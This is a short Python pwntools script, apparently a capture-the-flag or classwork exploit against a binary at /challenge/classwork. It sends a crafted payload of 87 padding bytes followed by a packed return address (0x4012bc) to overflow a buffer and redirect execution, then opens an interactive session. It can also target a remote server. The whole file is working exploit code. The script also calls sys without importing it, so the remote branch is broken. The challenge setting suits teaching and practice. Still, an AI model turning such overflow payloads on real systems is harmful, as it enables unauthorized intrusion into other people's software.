#!/usr/bin/env python3
import pwn


def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw, aslr=True)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw)


binPath = "/challenge/classwork"
isRemote = pwn.args.REMOTE

gdbscript = '''
break *main+97
continue
'''.format(**locals())

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

io = start()
io.recvuntil(b'>', timeout=1)
naboo = pwn.p64(0x00000000004012bc)
p = b'2' + b'\x90' * 87 + naboo
io.sendline(p)
io.interactive()
